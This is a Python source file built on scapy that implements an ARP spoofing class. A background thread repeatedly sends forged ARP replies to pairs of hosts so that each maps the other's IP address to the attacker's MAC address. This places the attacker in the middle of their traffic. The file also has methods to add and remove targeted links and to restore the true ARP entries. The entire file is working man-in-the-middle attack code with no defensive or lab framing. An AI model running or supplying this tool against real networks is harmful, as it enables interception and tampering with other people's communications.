from scapy.layers.l2 import ARP, Ether
from scapy.all import *
import threading

class ArpSpoofer:
    def __init__(self, spyMac, interface, interval = 1):
        self.spyMac = spyMac
        self.interface = interface
        self.stationLinks = []
        self.interval = interval
    def spoof(self):
        print("Setting Up Arp Spoofer...")
        arpThread = threading.Thread(target=self.spoofThread)
        arpThread.start()

    def spoofThread(self):
        while True:
            for link in self.stationLinks:
                self.sendFakeArp(link)
            time.sleep(self.interval)

    def sendFakeArp(self, stationLink):
        self.sendArpAnswer(stationLink.sta1.staIP, stationLink.sta2.staIP, stationLink.sta1.staMac, self.spyMac)
        self.sendArpAnswer(stationLink.sta2.staIP, stationLink.sta1.staIP, stationLink.sta2.staMac, self.spyMac)

    def sendArpAnswer(self,victimIp, spoofedIp, victimMac, desiredMac):
        spoofedPacket = Ether(dst=victimMac) / ARP(op="is-at", psrc=spoofedIp, pdst=victimIp, hwsrc=desiredMac,hwdst=victimMac)
        sendp(spoofedPacket, verbose=False, iface=self.interface)

    def repair(self, stationLink):
        self.sendArpAnswer(stationLink.sta1.staIP, stationLink.sta2.staIP, stationLink.sta1.staMac, stationLink.sta2.staMac)
        self.sendArpAnswer(stationLink.sta2.staIP, stationLink.sta1.staIP, stationLink.sta2.staMac, stationLink.sta1.staMac)

    def updateStaLinks(self, stationLinks):
        oldLinks = self.stationLinks
        self.stationLinks = stationLinks
        for link in oldLinks:
            if link not in stationLinks:
                self.repair(link)

    def addStaLink(self, stationLink):
        for link in self.stationLinks:
            if link == stationLink:
                return
        print(f"Adding {stationLink} To Spoofer.")
        self.stationLinks.append(stationLink)

    def delStaLink(self, stationLink):
        for link in self.stationLinks:
            if link == stationLink:
                print(f"Removing {stationLink} From Spoofer.")
                self.stationLinks.remove(link)
                self.repair(link)
                return